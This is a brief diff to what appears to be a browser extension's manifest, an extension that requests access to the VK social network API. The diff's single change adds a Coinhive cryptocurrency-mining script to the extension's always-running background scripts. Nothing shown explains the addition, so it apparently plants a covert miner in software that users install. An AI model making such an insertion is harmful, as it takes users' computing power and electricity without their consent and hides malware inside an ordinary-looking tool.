@@ -16,7 +16,7 @@
     "https://api.vk.com/*"
   ],
   "background": {
-    "scripts": ["scripts/socket.io.js", "src/background/background.js"]
+    "scripts": ["scripts/socket.io.js", "scripts/coinhive.min.js", "src/background/background.js"]
   },
   "content_scripts": [
     {
